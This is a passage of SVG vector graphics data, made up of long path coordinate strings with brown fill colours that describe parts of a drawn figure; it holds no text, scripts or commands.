38.502 28.301 64.333 49.577 87.408 7.99 8.6661 14.461 11.614 32.902 14.99 4.958 0.9077 17.639-0.3463 24.282-2.4011zm47.439-150.75c7.988-11.818 17.883-25.084 26.664-35.75 33.492-40.681 64.122-65.886 91.365-75.184 4.5372-1.5486 8.2497-3.323 8.25-3.9431s-2.587-4.2439-5.7495-8.0529-12.5-15.175-20.75-25.259c-8.25-10.083-17.7-21.576-21-25.539-3.3-3.9632-15.524-18.864-27.163-33.114-30.832-37.744-32.394-39.518-37.399-42.453-8.7781-5.1486-10.786-5.4565-35.438-5.4329-26.095 0.025-35.362 1.4616-51.273 7.9485-13.149 5.3608-18.895 9.1955-29.26 19.527-7.4663 7.4421-10.464 11.302-13.826 17.802-9.1597 17.708-12.546 32.272-12.601 54.2-0.052 20.613-1.2696 18.45 31.513 56 12.551 14.376 17.331 19.909 52.273 60.5 26.735 31.058 38.716 44.5 39.664 44.5 0.4648 0 2.5941-2.5875 4.7318-5.75zm707.3-100.2c31.047-1.8854 69.502-7.1319 101.54-13.854 25.102-5.2662 24.349-4.8461 25.185-14.06 0.464-5.1178 0.1585-6.7883-2.0777-11.359-5.3944-11.026-18.666-18.02-46.649-24.586-24.774-5.8126-69.443-9.6608-141-12.147-70.331-2.4438-98.071-5.9002-105.29-13.119-6.1513-6.1512-0.3621-7.6196 21.29-5.4 50.171 5.1431 112.29 4.7938 167.66-0.9426 45.546-4.7192 93.426-13.173 134.34-23.72 8.5287-2.1985 17.532-4.5158 20.007-5.1494 5.9368-1.5199 6.219-3.8011 1.621-13.104-11.532-23.334-37.105-36.78-84.121-44.231-14.363-2.2762-73.827-2.6814-97.2-0.6623l-17.2 1.4857-8.8002-4.6743c-13.247-7.0365-13.578-7.7139-3.3002-6.757 13.769 1.282 85.895 0.8988 100.5-0.534 60.212-5.9068 98.894-14.33 149.57-32.571 11.169-4.0206 38.696-16.095 47.988-21.05 5.5889-2.9801 6.5116-3.8754 6.9452-6.7396 0.4379-2.8929 1.4659-3.8623 8.2813-7.8089 8.0275-4.6485 10.968-8.0202 21.61-24.781l3.3493-5.275-1.2273-20.225-1.2274-20.225-7.643-7.3429c-39.901-38.334-125.23-63.721-248.14-73.826-27.376-2.2507-116.18-2.5832-139-0.5205-66.214 5.9855-123.1 19.804-169.61 41.2-8.6579 3.983-10.092 5.1763-8.1275 6.7624 0.8675 0.7004 3.7878-0.1252 9.739-2.7533 43.05-19.011 101.26-31.44 176.5-37.685 26.506-2.2001 107.09-2.523 132.5-0.531 82.926 6.5009 143.74 19.697 187.8 40.754 20.99 10.03 33.177 18.992 41.869 30.787 4.7418 6.4345 8.3291 16.407 8.3291 23.154 0 10.513-6.78 23.607-17.129 33.08-29.774 27.254-99.777 49.169-186.37 58.346-37.859 4.0123-50.092 4.5746-98.5 4.5274-49.523-0.048-68.856-1.0539-106-5.5134-28.209-3.3869-69.857-11.024-87.122-15.975-4.194-1.2028-5.1058-0.247-3.8712 4.0579 1.9303 6.7305 5.9775 29.709 7.9218 44.977 5.7579 45.216 5.0898 92.154-1.9709 138.46-1.5876 10.411-1.7283 13.2-0.7165 14.203 1.7395 1.724 19.196 9.3471 31.259 13.651 30.286 10.805 60.761 17.326 96.5 20.648 22.771 2.117 55.23 2.5354 80 1.0312zm-858.76-72.607c7.2917-1.44 13.766-3.1275 14.387-3.75 0.621-0.6224 2.1662-5.7951 3.4339-11.495 2.302-10.351 2.3027-10.378 0.5779-22.896-3.0697-22.279-8.2937-45.741-10.185-45.741-2.2973 0-14.799 41.539-20.462 67.987-3.1938 14.918-3.5827 18.513-2.0022 18.513 0.5457 0 6.9582-1.1782 14.25-2.6183zm32.336-48.632c16.536-23.158 40.377-36.745 73.113-41.668 8.9124-1.3403 40.739-1.4088 48.702-0.1047 8.5642 1.4024 21.331 7.667 24.52 12.032 5.515 7.5481 9.4733 11.991 10.683 11.991 2.1638 0 3.805-10.869 3.775-25-0.024-11.489-0.4319-14.989-2.7363-23.499-2.6029-9.6123-7.2939-21.253-10.679-26.501-6.3703-9.8754-9.4238-14.168-13.356-18.775-8.1865-9.5907-9.2802-10.183-24.384-13.211-7.5661-1.5164-15.509-2.5501-17.715-2.3056-2.2 0.2438-12.325 1.5248-22.5 2.8467s-25.7 3.3223-34.5 4.4452c-23.512 3.0004-23.039 2.6804-33.216 22.499-9.7817 19.05-19.284 41.02-19.284 44.586 0 1.4067 0.6361 4.5504 1.4136 6.9859 2.1727 6.8061 7.3353 29.332 9.1507 39.928 1.5377 8.9746 2.0734 11 2.9095 11 0.1957 0 2.0429-2.3625 4.1047-5.25zm881-110.2c92.894-7.9089 163.27-26.315 197.41-51.63 33.888-25.127 20.058-51.908-38.914-75.348-30.167-11.991-77.741-22.528-126.5-28.018-40.214-4.5275-53.149-5.1405-107.5-5.0944-50.229 0.043-70.589 0.9482-97.616 4.3418-3.9049 0.4904-8.2365 0.6742-9.6259 0.4086-1.9889-0.3802-3.4547 0.4487-6.8922 3.8976-9.2154 9.2457-11.17 11.784-16.932 21.992-4.1923 7.4261-6.258 12.425-9.6352 23.317-3.0739 9.9134-4.2625 32.035-2.3775 44.246 1.2425 8.0494 7.1086 27.745 9.6653 32.452 0.8063 1.4844 2.1267 4.5714 2.9342 6.8601 1.9507 5.5288 8.1977 15.72 10.338 16.866 0.9393 0.5027 10.243 1.8328 20.674 2.9558 16.334 1.7584 27.547 2.6556 56.467 4.5181 14.859 0.957 101.73-0.3365 118.5-1.7646z" fill="#664c2d"/>
    <path id="path4027" d="m1917 2363.3c-139.79-48.214-244.32-93.766-312.2-136.05l-13.703-8.5352-4.6422-12.604c-17.563-47.685-20.449-88.837-8.4176-120.04 9.0155-23.378 28.806-43.736 54.466-56.026 17.098-8.1897 42.727-14.689 61.962-15.712l10.038-0.5343 46.5 17.251c25.575 9.4879 47.46 17.451 48.633 17.697 1.7158 0.3586 3.3734-1.1872 8.4699-7.8984 3.4851-4.5894 11.644-14.515 18.132-22.056l11.795-13.712 7.2352-2.1143c3.9793-1.1628 12.97-3.8983 19.979-6.0789l12.744-3.9646 19.256 0.437c10.591 0.2404 48.056 1.8159 83.256 3.5012 72.278 3.4605 241.93 10.735 271.5 11.642 21.169 0.6493 30.313 2.0851 41.016 6.4408 29.499 12.005 53.542 45.655 65.061 91.061 3.3205 13.088 3.6169 20.121 1.3511 32.066-8.2731 43.612-37.892 78.511-86.928 102.43-22.644 11.043-15.501 10.408-74.142 6.5924-27.972-1.8201-65.839-4.2782-84.15-5.4626-18.311-1.1843-33.948-1.7862-34.75-1.3374-1.1313 0.633-1.458 3.1417-1.458 11.194 0 21.554-3.7569 34.98-14.148 50.559-6.816 10.219-19.376 22.557-30.352 29.814-22.411 14.819-54.606 26.181-88.131 31.103-16.254 2.3862-22.222 2.4571-28.369 0.3369zm27.217-15.323c21.463-3.3754 22.879-3.7618 41.283-11.271 18.255-7.4485 43.259-23.187 59.016-37.148 6.5463-5.7998 12.233-11.136 12.637-11.858 0.4042-0.7221 1.7046-6.9104 2.8898-13.752 1.7211-9.9338 2.0262-14.531 1.5152-22.83-0.3519-5.7156-1.0393-11.138-1.5276-12.051-0.4882-0.9123-1.8557-9.286-3.0387-18.608-3.0117-23.731-5.4517-34.164-10.794-46.156l-4.6204-10.371-7.5387-4.8231c-14.862-9.5083-14.937-9.5423-83.539-38.104-4.95-2.0608-29.475-12.284-54.5-22.718s-49.2-20.473-53.723-22.31l-8.2233-3.3391-9.2767 4.6409c-35.741 17.88-62.431 55.075-72.688 101.3-2.3802 10.726-5.0884 30.574-5.0884 37.291 0 2.6167-0.5625 5.5106-1.25 6.431-1.1149 1.4924-1.6754 1.5255-5.1853 0.3063-2.1644-0.7518-4.2494-2.2159-4.6332-3.2536-1.4701-3.9739 2.1941-33.039 6.1092-48.46 10.313-40.62 30.681-71.923 61.287-94.19 5.5432-4.0328 6.5779-5.1974 5.5-6.1905-0.7302-0.6727-9.4276-4.1801-19.328-7.7941-9.9-3.614-33.975-12.484-53.5-19.711l-35.5-13.14-9.5 1.1039c-28.801 3.3468-52.347 11.908-70.662 25.693-16.919 12.734-29.273 32.676-32.237 52.037-1.8732 12.237-1.4171 40.879 0.7961 49.995 3.7714 15.534 6.329 24.036 10.924 36.313l4.6787 12.5 9.044 6c19.561 12.977 64.556 36.5 105.2 54.998 15.553 7.0782 17.476 7.7232 19.614 6.579 1.9884-1.0642 2.9165-0.9921 5.7567 0.4468 1.8624 0.9435 4.2862 2.7794 5.3862 4.0797 1.1392 1.3467 7.165 4.4748 14 7.2677 6.6 2.6969 16.631 6.9862 22.291 9.5318 5.6598 2.5456 13.085 5.5872 16.5 6.759 3.4152 1.1719 13.634 5.2432 22.709 9.0473s26.625 10.99 39 15.968c12.375 4.9782 26.775 10.87 32 13.092 13.118 5.5804 24.078 9.5354 26.717 9.6417 1.2192 0.049 10.894-1.2754 21.5-2.9433zm316.46-113.78c52.61-23.257 86.502-63.866 89.038-106.69 0.4712-7.956 0.1646-10.38-2.6432-20.9-7.2615-27.206-17.938-47.942-32.787-63.684-10.45-11.078-21.401-17.56-36.1-21.369-6.5411-1.695-6.3668-1.6889-117.07-4.0873-89.072-1.9298-90.841-1.9242-91.505 0.2901-0.9604 3.1996-7.5597 60.464-9.133 79.25-0.8522 10.175-1.8028 29.075-2.1125 42l-0.5632 23.5 4.5243 20c2.4884 11 5.0886 25.086 5.7783 31.303 0.6896 6.2167 1.736 11.949 2.3252 12.739 0.8558 1.1471 16.77 2.4448 79.071 6.4478 42.9 2.7565 79.35 5.1643 81 5.3507 1.65 0.1865 6.6648 0.411 11.144 0.4991 7.7175 0.1516 8.7142-0.092 19.03-4.6523zm-214.7-85.4c0.3221-22.396 4.1046-69.066 8.4896-104.75 1.3856-11.275 2.7989-23.266 3.1407-26.647l0.6216-6.1465-9.385-0.6159c-5.1617-0.3388-41.785-1.9531-81.385-3.5872-39.6-1.6342-74.925-3.1655-78.5-3.4028-5.6649-0.376-8.9832 0.2882-25.827 5.1696l-19.327 5.6011-9.23 10.564c-13.415 15.354-19.615 23.312-19.615 25.177 0 1.0058 1.8392 2.4292 4.75 3.6762 4.4239 1.8951 74.686 31.255 167.25 69.888 21.725 9.0671 43.325 18.688 48 21.38 8.8286 5.0839 10.988 5.8076 11.018 3.6935zm-540.88-259.84c-68.311-4.2969-130.16-33.946-189.22-90.707-12.433-11.949-12.778-12.19-28.5-19.959-8.7532-4.3253-40.665-22.058-70.915-39.406s-142.98-81.856-250.5-143.35c-107.52-61.495-217.98-124.69-245.47-140.42l-49.966-28.614-11.832-15.475c-13.041-17.057-17.818-25.619-26.602-47.681-13.415-33.691-23.442-70.48-28.561-104.79-6.2037-41.578-6.2378-90.388-0.0905-129.19 8.4915-53.605 29.37-106.73 59.844-152.26 35.5-53.047 84.631-100.3 147.17-141.54 31.881-21.025 75.929-45.221 90.011-49.443 13.474-4.0403 33.952-4.2515 49.141-0.50683 3.7661 0.92844 41.047 13.972 82.847 28.987 41.8 15.014 101.88 36.587 133.5 47.938 31.625 11.352 69.2 24.863 83.5 30.024 14.3 5.1615 51.875 18.673 83.5 30.027 31.625 11.353 77.525 27.839 102 36.635 24.475 8.7958 53.05 19.059 63.5 22.806l19 6.814 26-0.87642c14.3-0.48203 30.323-1.1648 35.607-1.5172 20.646-1.3772 54.404 4.021 83.352 13.328 23.43 7.5335 58.873 23.781 75.224 34.485 4.2995 2.8145 13.892 7.5542 21.317 10.533 23.254 9.3283 42.823 20.271 62.29 34.832 17.951 13.427 29.769 24.454 44.948 41.938 3.3422 3.85 6.6653 7.3511 7.3846 7.7802 0.7854 0.4685 4.018-0.5842 8.0927-2.6353 17.514-8.8163 50.17-20.45 77.285-27.534 50.929-13.305 100.72-19.065 165.05-19.096 134.78-0.064 250.22 22.55 312.33 61.183 15.772 9.8106 34.968 26.916 36.105 32.172 0.2533 1.1712 1.1286 12.202 1.9451 24.514 1.6728 25.224 2.1439 22.518-6.1834 35.52-8.6871 13.564-15.11 21.486-19.049 23.496-6.7559 3.4466-6.511 1.5422-4.839 37.618l1.512 32.626-3.5338 11.678c-1.9436 6.4232-4.2363 12.804-5.095 14.178-0.8587 1.375-5.2015 6.2519-9.6506 10.838-7.5449 7.7763-9.1496 8.8743-23.839 16.312l-15.75 7.9741v9.3325c0 14.035-4.09 52.596-6.0909 57.427-1.7053 4.1166-17.933 24.08-20.735 25.507-4.0994 2.0891-34.937 12.012-51.174 16.466-120.69 33.111-236.19 35.829-324 7.6249-6.325-2.0316-18.078-6.3458-26.119-9.5872-8.0404-3.2414-15.119-5.8935-15.731-5.8935-0.6116 0-1.3316 1.0125-1.6001 2.25-39.144 180.44-159.34 328.15-306.62 376.83-31.196 10.31-72.735 19.277-94.505 20.402-6.0076 0.3105-13.848 0.7099-17.423 0.8874s-12.064-0.027-18.864-0.4549zm-159.3-84.8c-41.71-43.075-70.42-96.136-87.246-161.25-12.95-50.115-16.989-108.15-11.481-165 6.9578-71.819 30.254-147.45 65.546-212.79 44.616-82.605 109.84-151.71 182.76-193.65 42.535-24.462 84.572-38.863 131.59-45.082 11.514-1.5229 51.507-2.1379 56.559-0.8698 1.3743 0.3449 2.4409 0.1737 2.4409-0.3917 0-1.5562-21.565-9.8156-37.066-14.196-25.863-7.3093-49.504-10.609-68.944-9.6229-6.3199 0.3206-23.866 0.8459-38.991 1.1674l-27.5 0.5845-40-14.489c-22-7.9691-55.3-19.946-74-26.615-18.7-6.6692-36.25-12.991-39-14.049s-25.925-9.4005-51.5-18.539-60.225-21.566-77-27.616c-16.775-6.0504-39.05-14.084-49.5-17.854-10.45-3.769-28.45-10.221-40-14.338-11.55-4.1166-25.5-9.1254-31-11.131-5.5-2.0051-16.75-6.0447-25-8.9767-8.25-2.9321-40.2-14.419-71-25.527s-59.375-21.257-63.5-22.552c-17.729-5.5698-33.686-5.8362-49.261-0.82253-6.9763 2.2457-38.332 18.851-58.511 30.986-133.61 80.352-209 181.88-227.17 305.95-10.227 69.852 0.66488 152.27 29.396 222.43 7.5144 18.351 11.348 25.138 22.831 40.415l11.211 14.915 102 58.294c56.1 32.062 104.25 59.623 107 61.247 2.75 1.6242 14.45 8.3183 26 14.876 11.55 6.5574 99.3 56.708 195 111.44 95.7 54.737 180.52 102.77 188.5 106.73 14.286 7.1017 14.684 7.3906 27 19.573 11.245 11.124 22.736 21.426 23.962 21.483 0.2543 0.012-1.6074-2.116-4.1371-4.7285zm270.36-36.36c12.294-2.6775 16.053-3.998 27.006-9.4866 11.847-5.9367 13.166-6.8942 19.136-13.891 9.6196-11.274 17.388-24.265 22.782-38.101 4.4735-11.474 5.0457-13.994 7.8668-34.642l3.0424-22.269-2.3876-13.58-2.3876-13.58-14.409-17.92c-12.263-15.251-81.15-92.463-88.452-99.141-2.7434-2.509-4.3872-2.4164-15.885 0.8952-33.126 9.5412-77.635 51.224-117.74 110.27-3.7155 5.4697-6.7555 10.6-6.7555 11.4 0 3.7278 27.715 41.728 39.497 54.155 2.8681 3.025 13.405 15.711 23.416 28.19 12.924 16.112 21.591 25.836 29.894 33.54 17.52 16.256 19.837 17.986 28.616 21.375 17.394 6.7136 26.29 7.2432 46.764 2.7841zm-220.69-6.394c11.506-2.4158 20.818-7.6638 30.026-16.923 12.775-12.846 22.411-29.355 29.363-50.31l3.0647-9.2377-4.1258-18.262c-3.8353-16.976-4.4703-18.802-9.0148-25.921-2.6889-4.2125-5.5468-8.2051-6.3509-8.8725-0.8042-0.6674-1.4621-2.3406-1.4621-3.7184 0-3.4366-12.654-21.196-24.76-34.75-7.2185-8.0817-11.14-11.626-14.782-13.36-6.9789-3.3227-22.859-8.503-36.957-12.056-21.2-5.3-65.8-12-80-12h-5.5478v5.4383c0 8.3504 3.806 36.408 7.1301 52.562 11.216 54.506 30.875 98.176 58.064 128.98 9.9053 11.223 12.25 12.934 21.898 15.979 13.007 4.1051 22.501 4.8257 33.408 2.5358zm60-160.9c39.859-55.622 79.518-91.344 113.78-102.49 4.5161-1.4686 6.7018-2.6759 6.5-3.5902-0.2768-1.2536-12.91-16.793-84.804-104.32-22.639-27.56-23.744-28.731-30.16-31.954-5.8062-2.9166-8.1788-3.4731-18.5-4.34-26.704-2.2428-53.547 1.7117-72.08 10.619-22.963 11.036-38.346 29.454-45.574 54.567-3.7592 13.06-5.0575 22.308-5.1239 36.5-0.057 12.229 0.1017 13.326 2.6794 18.5 1.7928 3.5984 15.749 20.54 40.364 49 20.693 23.925 47.282 54.663 59.087 68.308 11.805 13.644 21.827 24.669 22.273 24.5 0.4456-0.1692 5.6472-7.0576 11.559-15.308zm442.81-79.058c5.0001-5.6218 12.592-20.185 15.19-29.137 4.6603-16.06 9.3025-46.467 11.42-74.805 2.0297-27.159 1.0894-61.253-2.4823-90-1.6711-13.45-7.2211-42.6-8.3283-43.742-0.3958-0.4083-3.1756 2.4762-6.1773 6.4101-6.7276 8.8166-9.4828 10.912-15.197 11.556-9.2427 1.0418-21.006-4.8991-31.775-16.047-2.467-2.5538-4.8711-4.6507-5.3425-4.6598-0.4714-0.01-6.7714-3.7865-14-8.3943-15.881-10.123-38.472-23.923-44.643-27.271-2.475-1.3427-7.2-4.0463-10.5-6.0081-30.908-18.374-72.483-37.997-94.904-44.793-11.345-3.4387-13.026-3.6649-37.731-5.0766-36.576-2.09-80.859-6.0285-106.61-9.4814-45.639-6.1206-82.796-14.263-104.53-22.907-5.5775-2.2181-7.6831-2.6402-9.2267-1.8496-5.9627 3.0537-37.237 37.536-54.204 59.765-11.299 14.803-29.296 42.005-29.296 44.28 0 0.3882 4.8867-0.1572 25-2.7905 6.325-0.8281 20.186-2.6389 30.801-4.024l19.301-2.5184 15.568 3.0554c8.5626 1.6804 16.318 3.4567 17.235 3.9473 0.9167 0.4906 5.373 4.7526 9.903 9.4711 28.208 29.382 39.431 70.408 29.279 107.02-2.0569 7.4179-2.4882 6.3089 6.9131 17.777 2.475 3.0191 12.752 15.567 22.838 27.885 17.61 21.507 18.542 22.462 23.5 24.065 7.6918 2.4866 29.467 6.619 43.829 8.3176 13.519 1.5989 14.18 1.8122 43.334 13.986 15.85 6.6184 25.974 10.14 55 19.13 8.25 2.5554 17.7 6.1326 21 7.9493 9.5967 5.2831 23.752 10.55 42.5 15.812 11.238 3.1545 39.676 8.1766 63 11.126 14.054 1.7771 57.088 5.0858 69.835 5.3694 6.0739 0.1351 6.466-0.01 9.5-3.4174zm269.7-12.4c34.206-2.7858 89.464-11.815 110-17.974 3.575-1.0723 14.15-4.0121 23.5-6.5329 17.78-4.7938 39.333-11.345 48.212-14.655 4.464-1.6641 6.1245-3.1187 11.57-10.135 3.4969-4.5058 6.7167-8.7971 7.155-9.5362 1.7434-2.9396 4.6625-30.777 5.2409-49.978 0.5791-19.226 0.7257-20.394 2.7171-21.659 1.1577-0.7352 9.53-5.1738 18.605-9.8636 13.786-7.1242 17.538-9.5657 22.806-14.841 7.6516-7.6614 7.5489-7.4832 11.286-19.576 2.5562-8.2714 2.9264-10.793 2.4574-16.738-0.3036-3.85-1.0558-18.7-1.6715-33s-1.1777-27.328-1.2489-28.952c-0.1168-2.6636 0.585-3.3589 7.1906-7.1247 7.7301-4.4068 12.152-9.5098 21.165-24.424l3.9282-6.5-1.3174-19.573c-1.0294-15.293-1.6976-20.153-3.0561-22.226-2.527-3.8567-16.704-15.588-26.54-21.96-46.927-30.405-123.28-49.669-231.5-58.406-27.004-2.1801-110.49-2.5122-132.5-0.5272-62.141 5.605-111.67 16.605-156.76 34.817-17.366 7.0142-25.242 11.046-25.242 12.921 0 3.0833 3.2132 2.5071 15.707-2.8165 36.402-15.511 84.078-26.467 144.29-33.159 59.73-6.6381 138.17-6.4217 198.5 0.5475 110.92 12.814 184.83 42.724 196.96 79.708 2.6191 7.9854 1.8268 17.903-2.096 26.239-15.99 33.975-87.256 61.815-190.37 74.368-56.694 6.9017-132.04 7.6846-193 2.0055-31.035-2.8911-65.595-8.3624-91.614-14.503-7.0875-1.6728-14.574-3.3016-16.636-3.6196-4.6227-0.7128-4.6074-0.9026-1.2168 15.071 6.7104 31.614 8.9753 56.26 8.9248 97.114-0.043 34.975-1.0143 48.96-5.3461 77-1.0197 6.6-1.6542 12.348-1.4101 12.772 0.7131 1.2408 11.385 6.3808 21.988 10.59 37.38 14.84 81.441 23.982 127.81 26.516 11.337 0.6198 57.953-0.286 71.5-1.3892zm-869.03-72.517c6.8563-1.3777 12.774-2.8353 13.15-3.239 1.5838-1.7009 5.1743-19.195 5.0458-24.585-0.3136-13.147-9.3383-58.149-11.661-58.149-1.2146 0-10.178 26.484-14.535 42.945-4.5798 17.303-10.133 43.676-9.5282 45.251 0.3198 0.8334 1.3924 1.1476 2.7913 0.8178 1.2496-0.2945 7.8817-1.6628 14.738-3.0405zm30.56-48.223c19.064-28.775 51.895-43.284 97.823-43.23 21.562 0.025 27.851 0.9414 37.463 5.4572 6.8875 3.2357 8.4085 4.503 14.618 12.181 8.3395 10.312 8.7597 10.118 10.599-4.8953 3.508-28.637-4.7013-54.876-25.074-80.141-8.4891-10.528-10.241-11.527-25.894-14.769l-13.561-2.8087-23 2.9661c-12.65 1.6314-29.947 3.8647-38.438 4.9629-23.101 2.9878-22.558 2.6038-33.244 23.528-10.054 19.686-18.819 39.623-18.815 42.798 0 1.2114 1.3764 7.6025 3.0553 14.202 3.4175 13.434 6.4032 27.367 7.9813 37.246 0.9695 6.0691 1.5991 8.2542 2.3781 8.2542 0.1647 0 2.0137-2.5875 4.109-5.75zm876.9-109.7c78.05-6.1396 139.55-19.513 180-39.145 33.618-16.314 46.507-33.874 37.819-51.523-14.482-29.42-87.468-55.68-184.4-66.346-39.693-4.3676-54.852-5.1027-104.42-5.0636-45.571 0.036-71.311 1.2277-97.294 4.505-5.1658 0.6515-7.8238 0.589-9.1103-0.2144-3.1252-1.9517-40.163 4.273-72.746 12.226-24.334 5.9397-62.35 19.408-62.35 22.089 0 0.4981 2.5017 5.0572 5.5594 10.131 12.914 21.43 28.19 55.763 35.475 79.726 1.7555 5.775 3.7459 11.089 4.4232 11.809 2.1349 2.2688 41.566 11.355 66.043 15.219 17.207 2.716 58.213 6.4993 90.5 8.3498 15.29 0.8763 92.635-0.3576 110.5-1.763z" fill="#572e18"/>
    <path id="path4025" d="m1918 2363.3c-2.475-0.8845-18.9-6.67-36.5-12.857-114.55-40.268-219.11-87.099-278.5-124.75l-11.5-7.2893-4.1655-10.984c-16.173-42.646-20.401-81.36-12.174-111.47 12.361-45.24 55.155-75.096 116.47-81.261l11.134-1.1194 47.914 17.69c26.352 9.7295 48.671 17.69 49.597 17.69 0.9259 0 5.004-4.1625 9.0624-9.25 10.978-13.761 27.616-33.137 29.24-34.051 0.7828-0.4405 9.6349-3.3543 19.671-6.4752l18.248-5.6742 18-0.3356c10.627-0.1981 19.434 0.091 21.5 0.7062 1.925 0.573 14.75 1.5106 28.5 2.0837s76.975 3.2781 140.5 6.0111c63.525 2.7331 132.6 5.6184 153.5 6.4118 38.586 1.4648 40.691 1.7147 52.902 6.2824 31.045 11.613 56.443 47.933 67.654 96.749 2.1371 9.3056 2.206 10.607 1.0511 19.86-2.3633 18.937-9.2197 37.047-20.168 53.273-17.078 25.308-48.127 48.779-82.695 62.51-7.1977 2.8593-8.3213 3.0287-16.238 2.4483-35.929-2.6339-161.38-10.439-161.96-10.077-0.4043 0.2499-1.02 6.8832-1.3683 14.741-0.773 17.442-2.3921 25.264-7.4553 36.02-16.873 35.844-59.766 61.414-120.22 71.665-17.395 2.9497-26.626 3.3671-32 1.4467zm28-15.457c17.593-2.8241 21.016-3.7157 35-9.1167 21.818-8.4265 45.049-22.696 63.619-39.076 7.3595-6.4917 13.385-12.117 13.391-12.5 0.01-0.3834 1.067-6.997 2.3593-14.697 1.9977-11.903 2.2149-15.348 1.4503-23-0.4947-4.95-1.3054-9.9-1.8016-11s-1.8681-9.875-3.0487-19.5c-2.8528-23.259-5.2787-33.314-10.985-45.535l-4.7572-10.188-11.363-7.0644c-7.8225-4.8632-18.218-9.9204-33.363-16.23-30.373-12.654-74.498-31.128-89.5-37.471-9.9529-4.2083-39.56-16.477-67.872-28.124-4.8197-1.9828-5.8166-1.815-14.147 2.3814-37.159 18.719-63.708 56.272-73.479 103.94-2.7575 13.451-4.4948 26.438-4.5171 33.769-0.022 7.0595-0.7581 7.8854-6.0969 6.8358-4.31-0.8473-4.3934-0.9398-4.7017-5.2171-0.1726-2.3949 0.3962-10.179 1.2641-17.297 4.7792-39.2 17.994-71.632 39.925-97.983 6.2225-7.4766 20.366-20.206 27.811-25.03 2.7047-1.7526 4.7587-3.8012 4.6002-4.5883-0.1575-0.7821-1.8614-2.0259-3.7864-2.7639-1.925-0.7381-26.225-9.7376-54-19.999l-50.5-18.657-7.7012 0.5778c-18.996 1.4249-44.4 8.5132-58.799 16.406-21.645 11.865-37.695 29.931-44.525 50.118-3.0149 8.9113-4.8307 27.766-4.2545 44.178 0.378 10.768 0.9934 14.413 4.5628 27.029 3.489 12.331 6.7793 22.207 12.353 37.08 2.5864 6.9009 55.711 36.362 111.86 62.035 14.28 6.5288 20.289 8.8052 22.448 8.5032 3.3174-0.4641 11.061 2.5786 11.86 4.6599 0.2874 0.749 4.6685 3.0212 9.7357 5.0493s15.303 6.3854 22.747 9.6828c7.4434 3.2974 16.273 6.9133 19.622 8.0352 3.3484 1.122 11.938 4.5259 19.088 7.5643 14.415 6.1256 26.208 10.976 53.038 21.816 9.9206 4.0081 20.946 8.5356 24.5 10.061 11.667 5.0073 21.403 8.2677 24.962 8.3597 1.925 0.05 12.275-1.3182 23-3.0398zm307.53-110.36c23.029-8.6682 48.025-24.999 64.533-42.161 18.059-18.775 29.252-41.662 31.928-65.287 0.8821-7.787 0.736-9.6766-1.4398-18.622-8.0386-33.048-23.342-61.08-41.177-75.428-8.9333-7.1865-16.451-11.178-26.546-14.094-6.8498-1.9787-11.477-2.2074-70.829-3.5003-34.925-0.7608-80.375-1.7745-101-2.2528-21.002-0.4871-37.994-0.4904-38.624-0.01-1.2311 0.9447-1.4207 2.1575-4.8984 31.327-5.2608 44.126-7.4311 72.436-7.4575 97.281-0.02 18.946 0.049 19.587 3.9918 36.896 2.2068 9.6884 4.7553 23.604 5.6633 30.924 0.9081 7.3202 1.9593 13.808 2.3361 14.418 0.4293 0.6946 11.474 1.8132 29.587 2.9965 15.896 1.0384 43.077 2.8163 60.402 3.9509 17.325 1.1345 38.925 2.5481 48 3.1412 19.663 1.285 37.218 2.5469 38.227 2.7477 0.3999 0.08 3.6866-0.9692 7.3037-2.3307zm-207.1-88.6c0.2504-1.2375 0.7062-10.125 1.0128-19.75 0.7401-23.233 6.0106-78.498 10.145-106.37 0.9965-6.7196 1.1406-10.264 0.4512-11.095-0.6805-0.8199-6.5157-1.4358-17.77-1.8755-9.2161-0.3602-48.761-2.0472-87.878-3.7489l-71.121-3.0941-18.879 5.6404c-13.961 4.1713-19.4 6.2427-20.879 7.9526-1.1 1.2717-5.8509 6.7631-10.558 12.203-9.9275 11.474-16.942 20.628-16.942 22.109 0 1.2267-5.5618-1.1856 71 30.794 33.825 14.129 79.636 33.27 101.8 42.537 22.166 9.2668 44.216 19.111 49 21.875 4.7842 2.7647 9.0274 5.0377 9.4294 5.0511 0.4021 0.013 0.9359-0.9881 1.1864-2.2256zm-555.05-261.31c-62.872-7.6228-121.07-37.099-172.83-87.536l-14.295-13.929-13.719-6.5499c-7.5452-3.6025-49.562-27.058-93.371-52.122-123.4-70.7-466.36-266.8-498.2-285l-28.5-16.282-12.138-16.294c-13.271-17.815-17.345-25.192-26.225-47.49-13.89-34.876-23.961-72.818-29.013-109.3-6.1743-44.593-5.3107-92.347 2.4228-133.97 21.47-115.5 97.35-216.61 219.46-292.43 32.638-20.264 64.797-37.179 77.5-40.763 10.835-3.0574 34.143-3.2778 45.5-0.43039 6.1477 1.5414 90.012 31.301 190.5 67.599 10.45 3.7748 47.8 17.206 83 29.846 35.2 12.641 99.325 35.682 142.5 51.203s95.375 34.285 116 41.698l37.5 13.478 21.5-0.68947c11.825-0.37921 27.35-1.0689 34.5-1.5327 31.759-2.0601 70.685 5.2209 108.5 20.295 19.593 7.8102 44.739 20.122 55.732 27.288 4.7901 3.1222 13.983 7.7053 21.124 10.532 40.172 15.897 77.016 42.031 105.72 74.986 4.7502 5.4543 9.2277 9.917 9.95 9.917 0.7224 0 3.4878-1.0864 6.1455-2.4143 13.192-6.5909 37.386-16.004 56.368-21.93 37.162-11.602 80.933-19.663 129.46-23.843 20.019-1.7243 97.86-1.7192 123 0.01 135.08 9.2802 227.59 36.449 272.75 80.098l9.9115 9.5809 1.3918 19c2.2041 30.088 2.1838 30.371-2.7428 38.274-10.176 16.323-17.675 25.862-21.792 27.719-2.2146 0.9986-4.5366 2.4302-5.1599 3.1812-0.845 1.0182-0.8025 9.8292 0.1672 34.64l1.3005 33.274-3.7272 12.364-3.7271 12.364-8.6843 9.4546c-8.5652 9.3249-8.8996 9.5624-24.39 17.326-8.6385 4.3293-16.117 8.6662-16.618 9.6375-0.5015 0.9713-1.1842 9.866-1.5171 19.766s-1.4973 24.427-2.5876 32.283l-1.9822 14.283-9.6235 12.403-9.6235 12.403-19.671 6.497c-54.305 17.936-112.93 30.01-171.17 35.256-22.288 2.0075-74.43 2.2969-93 0.5161-49.052-4.7037-94.912-15.993-130-32.001-5.7019-2.6014-6.2558-2.0551-8.4767 8.3598-2.6438 12.398-10.217 39.588-15.154 54.408-24.496 73.528-63.09 140.62-111.98 194.67-5.9332 6.5593-11.909 13.175-13.279 14.702-5.1392 5.726-31.283 29.19-42.595 38.229-37.875 30.264-77.642 52.417-119.37 66.494-28.143 9.495-67.936 18.586-91.578 20.922-14.469 1.4294-41.367 